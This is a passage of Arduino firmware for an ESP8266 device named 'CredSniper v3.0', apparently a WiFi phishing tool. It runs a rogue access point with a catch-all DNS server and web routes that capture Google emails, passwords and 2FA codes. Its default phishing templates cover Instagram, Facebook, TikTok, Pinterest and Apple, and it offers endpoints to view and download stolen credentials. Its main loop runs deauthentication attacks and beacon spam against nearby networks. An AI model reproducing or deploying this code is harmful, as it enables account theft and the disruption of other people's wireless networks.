    else WiFi.softAP("CredSniper", "dewdew5218");
    dnsServer.start(DNS_PORT, "*", apIP);
    delay(50);
  }
}

void handleDeleteFile(String filename) {
  String path = "/" + filename + ".html";
  String low = filename; low.toLowerCase();
  if (low == "google-email" || low == "google-password" || low == "google-2fa" ||
      low == "instagram" || low == "facebook" || low == "tiktok" ||
      low == "pinterest" || low == "apple") {
    uploadStatus = "❌ Cannot delete default";
    return;
  }
  if (SPIFFS.exists(path)) {
    SPIFFS.remove(path);
    if (currentTemplate == filename) currentTemplate = "google-email";
    uploadStatus = "🗑️ Deleted " + filename;
  }
}

void checkHeapHealth() {
  static unsigned long lastCheck = 0;
  if (millis() - lastCheck > 30000) {
    uint32_t maxBlock = ESP.getMaxFreeBlockSize();
    if (maxBlock < 5000) {
      Serial.printf("⚠️ Critical memory – max block: %u. Rebooting...\n", maxBlock);
      ESP.restart();
    }
    lastCheck = millis();
  }
}

int countSSIDsFromPROGMEM() {
  int count = 0;
  size_t len = strlen_P(ONE_DIRECTION_SSIDS);
  for (size_t i = 0; i < len; i++) {
    if (pgm_read_byte(&ONE_DIRECTION_SSIDS[i]) == '\n') count++;
  }
  return count;
}

// ========== SETUP & LOOP ==========
void setup() {
  Serial.begin(115200);
  delay(1000);
  Serial.println("\n\n==================================");
  Serial.println(" 🎯 CredSniper v3.0 (Aggressive Beacon Spam Edition)");
  Serial.println("==================================\n");
  randomMac();
  ssidCount = countSSIDsFromPROGMEM();
  Serial.printf("[+] Loaded %d One Direction SSIDs from PROGMEM\n", ssidCount);

  packetSize = sizeof(beaconPacket);
  if (!wpa2) { beaconPacket[34] = 0x21; packetSize -= 26; }
  else { beaconPacket[34] = 0x31; }
  memset(emptySSID, ' ', sizeof(emptySSID) - 1);
  emptySSID[31] = '\0';
  initSessions();

  if (!SPIFFS.begin()) {
    Serial.println("❌ SPIFFS Mount Failed! Formatting...");
    SPIFFS.format();
    if (!SPIFFS.begin()) { spiffsFailed = true; }
    else { spiffsMounted = true; }
  } else { spiffsMounted = true; }

  for (int i = 0; i < MAX_NETWORKS; i++) networks[i].ssid = "";
  selectedNetworkCount = 0;
  saveTemplatesToSPIFFS();
  loadStealthSetting();

  WiFi.mode(WIFI_AP_STA);
  wifi_promiscuous_enable(1);
  WiFi.softAPConfig(apIP, apIP, subnet);
  if (adminStealthMode) WiFi.softAP("CredSniper", "dewdew5218", 1, 1);
  else WiFi.softAP("CredSniper", "dewdew5218");
  dnsServer.start(DNS_PORT, "*", apIP);
  wifi_set_channel(channels[0]);

  webServer.on("/", handleRoot);
  webServer.on("/capture", handleCapture);
  webServer.on("/download-credentials", handleDownloadCredentials);
  webServer.on("/view-credentials", handleViewCredentials);
  webServer.on("/delete-credentials", HTTP_POST, handleDeleteCredentialsAction);
  webServer.on("/google-email", handleGoogleEmail);
  webServer.on("/google-password", handleGooglePassword);
  webServer.on("/google-2fa", handleGoogle2FA);
  webServer.on("/capture-2fa", handleCapture2FA);
  webServer.on("/live-credentials", handleLiveCredentials);
  webServer.on("/logs", handleLiveLogs);
  webServer.on("/manual-stop", HTTP_POST, handleManualStop);
  webServer.on("/set-stealth", HTTP_POST, handleToggleStealth);
  webServer.on("/upload", HTTP_POST, []() { webServer.send(200, "text/html", "<script>window.location.href='/'</script>"); }, handleFileUpload);
  webServer.on("/router-verify", HTTP_GET, handleRouterVerifyGet);
  webServer.on("/router-verify", HTTP_POST, handleRouterVerify);
  webServer.on("/router-result", HTTP_GET, handleRouterResult);
  webServer.on("/clear-live-logs", HTTP_POST, handleClearLiveLogs);
  webServer.onNotFound(handleNotFound);
  webServer.begin();
  performScan();

  Serial.println("\n✅ System Ready!");
  Serial.println("📶 Admin AP: CredSniper (Stealth: " + String(adminStealthMode ? "ON" : "OFF") + ")");
  Serial.println("🔐 Pass: dewdew5218 | 🌐 IP: 192.168.4.1");
  Serial.println("🔴 Live Logs: http://192.168.4.1/logs (admin / monitor123)");
  Serial.println("==================================\n");
}

void loop() {
  checkHeapHealth();
  dnsServer.processNextRequest();
  webServer.handleClient();
  if (deauthAll_active) performDeauthAll();
  else if (deauthing_active) performDeauth();
  performProvenBeaconSpam();
  if (!hotspotActive && !beaconSpamActive && millis() - lastScan >= 30000) {
    performScan();
    lastScan = millis();
  }
  delay(10);
}
